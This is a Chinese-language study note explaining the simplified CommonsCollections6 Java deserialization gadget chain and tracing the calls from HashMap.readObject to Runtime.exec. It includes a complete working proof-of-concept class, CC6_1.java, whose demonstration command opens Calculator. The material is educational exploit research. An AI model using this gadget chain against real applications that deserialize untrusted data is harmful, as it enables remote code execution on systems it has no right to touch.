# 反序列化基础篇-CC6简化版
# 0x00 前置知识
## writeObject和readObject
Java在序列化一个对象时，将会调用这个对象中的 `writeObject` 方法，参数类型是 `ObjectOutputStream` ，开发者可以将任何内容写入这个 `stream` 中；

反序列化时，会调用 `readObject` ，开发者也可以从中读取出前面写入的内容，并进行处理。

## 如何寻找Gadget?
一条完整的Gadget，应当具备以下成分：
- 入口类
- 链中类
- 危险方法（`Runtime.getRuntime().exec()`)
  - 不同类的同名函数
  - 任意方法调用（反射/动态加载字节码）

入口类条件：
- 可序列化
- 能重写readObject
- 接收任意对象作为参数（集合类型/接收Object）

链中类条件：
- 可序列化
- 接收任意对象作为参数（集合类型/接收Object）



## 为什么先学习CC6
在[CC1-LazyMap](https://github.com/reidmu/sec-note/blob/main/Java-sec/CC1-LazyMap.md)这篇文章中我们详细分析了 `CommonsCollections1` 这个利⽤链和其中的 `LazyMap` 原理。

但CC1受到高版本jdk的限制，因为 `sun.reflect.annotation.AnnotationInvocationHandler#readObject` 的逻辑发生了改变，在 `Java 8u71` 以后，这个利⽤链不能再利⽤了。 

如何解决⾼版本Java的利⽤问题？ -> 这就是为什么学完CC1以后我们要直接跳来学CC6的原因。

这篇文章主要是学习P神的这条简化版利⽤链：
```
/*
Gadget chain:
	java.io.ObjectInputStream.readObject()
		java.util.HashMap.readObject()
			java.util.HashMap.hash()

org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()

org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
	org.apache.commons.collections.map.LazyMap.get()

org.apache.commons.collections.functors.ChainedTransformer.transform()

org.apache.commons.collections.functors.InvokerTransformer.transform()
	java.lang.reflect.Method.invoke()
		java.lang.Runtime.exec()
*/
```

在学习CC6的时候，看的主要是从 `java.util.HashMap.readObject()` 到 `org.apache.commons.collections.map.LazyMap.get()` 的那⼀部分，因为 `LazyMap#get` 后⾯的部分已经在 [CC1-LazyMap](https://github.com/reidmu/sec-note/blob/main/Java-sec/CC1-LazyMap.md) 分析过了。


# 0x01 环境搭建
## 1.1 maven项目导入依赖

pom.xml导入依赖
```
    <dependency>
      <groupId>commons-collections</groupId>
      <artifactId>commons-collections</artifactId>
      <version>3.1</version>
    </dependency>
```

## 1.2 JDK版本及sun包源码

`CC6` 链可以在Java 7和8的⾼版本触发，没有版本限制。

`CC6` 链需要用到 `sun` 包中的类，而 `sun` 包在 `jdk` 中的代码是通过 `class` 文件反编译来的，不是 `java` 文件，调试不方便，通过 `find usages` 是搜不到要找的类的，而且其代码中的对象是 `var` 这样的形式，影响代码的阅读。

下载`sun`包，把 `src/share/classes`中的 `sun` 文件夹 放到对应 `jdk` 的`src`文件夹下。

https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4

<div align=center><img width="641" alt="image" src="https://user-images.githubusercontent.com/84888757/204700877-5c68fc27-ba97-4dab-a0cd-01a70d91bdeb.png" /></div>

将`sun`包复制到对应`jdk`的`src`目录下（Macbook时在/Library/Java/JavaVirtualMachines/jdk1.8.0_66.jdk/Contents/Home/Src下）

<img width="1155" alt="image" src="https://user-images.githubusercontent.com/84888757/204702741-0e8acfc6-52ec-4f28-965b-08e3178d7426.png">

然后在 IDEA 中，`File-->Project Structure- ->SDKs` 将 `src` 目录的路径加到 `Sourcepath` 中去：  

<div align=center><img width="894" alt="image" src="https://user-images.githubusercontent.com/84888757/204702840-522354dc-6fc8-4e28-b106-56b240d0908f.png" /></div>

下载maven源码包：

<div align=center><img width="445" alt="image" src="https://user-images.githubusercontent.com/84888757/204703339-9e7d9b3c-e354-489d-8ff2-e5992f3ddc8f.png" /></div>


## 1.3 IDEA 调试设置

把 IDEA 调试设置中的 **自动tostring** 和 **展示集合对象** 这两个选项关掉，否则调试的时候会有怪事（😓）

<img width="982" alt="image" src="https://user-images.githubusercontent.com/84888757/205512008-51535e70-9dcc-472f-be62-a8c64d226986.png">



# 0x02 CC6 Gadget 思路
简单来说，解决 CC1 Java ⾼版本利⽤问题，就是在找是否还有其他调⽤ `LazyMap#get()` 的地⽅。


这里搞一张白日梦组长的图助于理解，上面两条就是 [CC1-TransformedMap](https://github.com/reidmu/sec-note/blob/main/Java-sec/CC1-TransformedMap.md) 和 [CC1-LazyMap](https://github.com/reidmu/sec-note/blob/main/Java-sec/CC1-LazyMap.md) 的调用链，红框开始就是CC6的调用链。


<div align=center><img width="900" alt="image" src="https://user-images.githubusercontent.com/84888757/205502970-d8c7e189-7a3f-48ac-822c-7d0405cac18e.png" /></div>

通过对 `LazyMap#get` 进行 `Find Usage` 找到了 `TiedMapEntry#getValue` ：

![image](https://user-images.githubusercontent.com/84888757/205503585-35da8367-b8fd-46ff-851e-49efbfc3718f.png)

`org.apache.commons.collections.keyvalue.TiedMapEntry#getValue`  ⽅法中调⽤了 `this.map.get` ；

而 `org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode` ⽅法中又调⽤了 `getValue` ⽅法：

<div align=center><img width="769" alt="image" src="https://user-images.githubusercontent.com/84888757/205504343-57b506d7-5a20-4d40-87f1-5da4a8998890.png" /></div>

所以，想触发 `LazyMap` 利⽤链，就要找到哪⾥调⽤了 `TiedMapEntry#hashCode` 。

我们要找的利用链如下：
1. `xxx#readObject` ->  ... -> `yyy#bb`
2. `TiedMapEntry#hashCode` 
3. `TiedMapEntry#getValue`
4. `LazyMap#get`
5. `ChainedTransformer#transform`
6. `InvokerTransformer#transform`

`ysoserial` 中，`CC6` 利用链如下：
1. `java.util.HashSet#readObject `
2. `HashMap#put()`
3. `HashMap#hash(key)`
4. `TiedMapEntry#hashCode()`
5. `TiedMapEntry#getValue`
6. `LazyMap#get`
7. `ChainedTransformer#transform`
8. `InvokerTransformer#transform`

🔔 看到 `HashMap#put()` -> `HashMap#hash(key)` 的调用，有没有想起我们曾经学过的 `URLDNS` 。

实际上，在 `java.util.HashMap#readObject` 中就可以找到 `HashMap#hash()` 的调⽤，所以可以去掉最前⾯的两次调⽤：

<div align=center><img width="767" alt="image" src="https://user-images.githubusercontent.com/84888757/205504797-530de851-7b1b-4d77-8b1d-55fdb36627f7.png" /></div>


<div align=center><img width="767" alt="image" src="https://user-images.githubusercontent.com/84888757/205504871-26fdf4bb-caca-4b8a-b44c-211f36d98f9e.png" /></div>


# 0x03 构造CC6 Gadget POC
## 3.1 构造恶意LazyMap
⾸先，把恶意 `LazyMap` 构造出来:
```
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        new ConstantTransformer(1),
};

Transformer transformerChain = new ChainedTransformer(transformers);

// 创建一个 map ，不用添加 Entry
Map innerMap = new HashMap();

// 调用 LazyMap.decorate 实例化 LazyMap
// 先传入一个人畜无害的 transformerChain 对象 ConstantTransformer(1) ，避免本地调试时触发命令执行
Map outerMap = LazyMap.decorate(innerMap, new ConstantTransformer(1));
```

上述代码，为了避免本地调试时触发命令执⾏，构造 `LazyMap` 的时候先⽤了⼀个无伤大雅的虚假 `transformerChain` 对象 `ConstantTransformer(1)` ，等最后要⽣成 `Payload` 的时候，再把真正的 `transformers` 替换进去。

## 3.2 创建 TiedMapEntry 实例
看一下 TiedMapEntry 的构造函数：

<div align=center><img width="767" alt="image" src="https://user-images.githubusercontent.com/84888757/205505132-3e3228d0-dad8-4645-b14f-3e725bb421ea.png" /></div>


现在，已经创建了⼀个恶意的 `LazyMap` 对象 `outerMap` ，将其作为` TiedMapEntry` 的 `map` 属性，随便写个 `key` ：
```
TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
```

然后为了调⽤ `TiedMapEntry#hashCode()` ，我们需要将 `tme` 对象作为 `HashMap` 的⼀个 `key` 。

注意，这⾥我们需要新建⼀个 `HashMap` ，⽽不是⽤之前 `LazyMap` 利⽤链⾥的那个 `HashMap` ，两者没任何关系：
```
Map expMap = new HashMap();
expMap.put(tme, "valuevalue");
```

然后利用反射将虚假 `transformerChain` 对象 `ConstantTransformer(1)` 替换为执行命令的数组 `transformers`

```
Class c = LazyMap.class;
Field factoryField = c.getDeclaredField("factory");
factoryField.setAccessible(true);
factoryField.set(outerMap, transformerChain);
```

## 3.3 CC6 Gadget 踩坑记
最后放上序列化和反序列化代码
```
        //==================
        //⽣成序列化字符串
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(expMap);
        oos.close();

        System.out.println(bos);

        // 反序列化
        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();
```

但是执行后无法触发命令执行，进行调试，发现 `expMap.put(tme, "valuevalue");` 这个 `put` 语句也有调⽤到 `HashMap#hash(key)`

![image](https://user-images.githubusercontent.com/84888757/205507641-1b0c599f-5a83-4020-a99c-45671e7efa34.png)

而这里的 `key` 为 `TiedMapEntry` 的实例化对象 `tme`，调用的则是 `TiedMapEntry的hashcode` ：

![image](https://user-images.githubusercontent.com/84888757/205507741-dd0be951-5c8c-48fb-9023-04f2657f60bf.png)


然后就调用到 `LazyMap#get` 方法，此时 `lazymap` 中的 `key` 没有 `keykey` 。

所以进入 `if` 语句，执行了 `factory.transform(key);` ，因为前面构造 `LazyMap` 的时候先⽤了⼀个无伤大雅的虚假 `transformerChain` 对象 `ConstantTransformer(1)` ，所以此时并没有触发命令执⾏。

但也执行了 `map.put(key, value);` ，导致 `lazymap` 中的 `key` 之后在反序列化时就有 `keykey` 了。

<div align=center><img width="885" alt="image" src="https://user-images.githubusercontent.com/84888757/205511423-bf0a3dbc-4d71-466b-8be0-41f1f3c14c46.png" /></div>



再进行一次 `F9` 执行程序到下一次断点位置，走到反序列化过程中的 `LazyMap#get` 中，这才是我们之前想要的使用了正确的 `transformerChain` 的 `Gadget` （从 `readObject` 起步）。

`LazyMap` 中已存放有 `key` 为 `keykey` ，导致 `factory.transform(key)` 方法无法触发。

<div align=center><img width="957" alt="image" src="https://user-images.githubusercontent.com/84888757/205511877-b4e4f53a-b01e-44c9-8c30-1f034bc6a124.png" /></div>



解决⽅法：

移除 `LazyMap` 中的 `keykey` 这个 `key`。

```
outerMap.remove("keykey");
outerMap.clear();
```

## 3.4 完整的 CC6 Gadget POC
最后，构造的完整POC如下：

📒 `CC6_1.java`

```
package org.vulhub.Ser;

import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC6_1 {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
                new ConstantTransformer(1),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        // 创建一个map，不用添加Entry
        Map innerMap = new HashMap();

        // 调用 LazyMap.decorate 实例化 LazyMap
        // 先传入一个人畜无害的虚假 `transformerChain` 对象 `ConstantTransformer(1)` ，避免本地调试时触发命令执行
        Map outerMap = LazyMap.decorate(innerMap, new ConstantTransformer(1));

        //创建TideMapEntry实例
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        //创建HashMap并将tme作为HashMap的key
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");

        // HashMap中已存放有key为keykey，导致 factory.transform(key) 方法无法触发,故移除 `LazyMap` 中的 `keykey` 这个 `key`
        outerMap.remove("keykey");
        // outerMap.clear();

        //将真正的transformers数组设置进来
        Class c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(outerMap, transformerChain);

//        //==================
//        //⽣成序列化字符串
//        ByteArrayOutputStream bos = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(bos);
//        oos.writeObject(expMap);
//        oos.close();
//
//        System.out.println(bos);
//
//        // 反序列化
//        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
//        ObjectInputStream ois = new ObjectInputStream(bis);
//        ois.readObject();

        // 序列化
        serialize(expMap);
        // 反序列化
        unserialize("ser_CC6_1.bin");

    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("./ser_CC6_1.bin");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(obj);
        outputStream.close();
        fileOutputStream.close();
    }

    public static void unserialize(String args) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(args);
        ObjectInputStream ois = new ObjectInputStream(fileInputStream);

        ois.readObject();
    }
}

```


# 0x04 参考链接
- [Java安全漫谈 - 12.简化版CommonsCollections6](https://t.zsxq.com/A2j2beE)
- [Java反序列化CommonsCollections篇(二)-最好用的CC链 @白日梦组长](url)


